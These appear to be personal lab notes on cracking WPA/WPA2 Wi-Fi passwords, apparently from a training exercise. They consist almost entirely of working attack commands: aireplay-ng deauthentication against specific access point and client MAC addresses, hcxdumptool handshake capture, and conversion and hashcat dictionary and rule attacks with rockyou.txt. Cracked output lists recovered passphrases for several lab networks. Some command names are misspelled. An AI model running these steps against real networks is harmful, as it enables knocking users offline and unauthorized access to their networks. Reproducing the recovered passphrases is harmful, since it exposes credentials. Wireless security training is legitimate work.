sudo airepay-ng -0 1 -a <BSSID> -c <CLIENT> interface
sudo aireplay-ng -0 1 -a 48:22:54:D5:ED:4E -c 58:CB:52:13:F8:6A wlan1mon 
sudo aireplay-ng -0 1 -a 50:D4:F7:6C:88:2F -c 58:CB:52:13:F8:6A wlx00c0cab46234 
08:C5:E1:46:B3:07
#sending one set of De-Auth packets, (64)
#set kismet to the directed channel the access point is on. If not ocked to channel you wont find the SSID
#best RSSI for the device
getting 0, check RSSI to the station
#1 LOCK TO CHANNEL
1. get the handshake
2. downloadpcap
3. rename to XXX.handshake
4. open it in wirehsark to see the 1,2,3,4 parts of the 4 parts handshake

f7f858d5d5ed9a30422d4fbfe4df3aefeee3be40845cd4f8912647d5d7a93f6c
PSK = PBKDF2(HMAC-SHA1, Passphrase + SSID, 4096, 256)
#cracking strategies
1. Dictionary
2. Combination attacks
3. Mask attacks
4. rules-based attacks
#installing required software
sudo apt install hashcat
sudo apt install hcxtools 
mkdir .hashcat#create the folder if its not already created in your home directory
#searching for what to run
hashcat --help | grep WPA
#debugging rules set you can view via the stdout
hashcat -r /usr/share/hashcat
hcspcapngtool -o hash.22000 inputfile.pcap
###########################################################
hcxdumptool -i <interface> -o dump.pcapng --enable_status=31
$ hcxpcapngtool -o hash.22000 -E elist dump.pcapng
$ hcxeiutool -i elist -d digitlist -x xdigitlist -c charlist -s sclist
$ cat elist digitlist xdigitlist charlist sclist > wordlisttmp
$ hashcat --stdout -r <rule> charlist >> wordlisttmp
$ hashcat --stdout -r <rule> sclist >> wordlisttmp
$ cat wordlisttmp | sort | uniq > wordlist
$ hashcat -m 22000 hash.22000 wordlist
############################################################
hcxpcapngtool -o dict.hash.22000 Lab1.handshake # this will generate a hash of the file
hashcat -a 0 -m 22000 dict.hash.22000 rockyou.txt
6f0db1d3ddede51992c71a90fe51c920:482254d5ed4e:58cb5213f86a:Lab-1:1password?
6df6d05343f37e4a33b89e50d72675c6:30de4b3d1ed4:c0eefb5a5245:Lab-2:2chairman
89e35e64e60398974c3495bef895ebb9:c0c9e300ad42:7c2edd17ff99:Lab-3:3password3
lab4 - not in list
0d9af1a531c935d78a7e0bb14cbc12c2:dc2c6e0400bd:08c5e146b307:Lab_5:iluvtacos!
98c154c954bc99a8db4f2ac22a98570e:74da885994ea:00cbcb6914cb:Lab-6:6password
lab7 - not on list
4dbca21ef55bad5631942bbf0e533a8d:14ebb6138e0d:ac374348f8fb:Lab_8:hotpizza

## This is how you view your hascat files
ls ~/.hashcat/

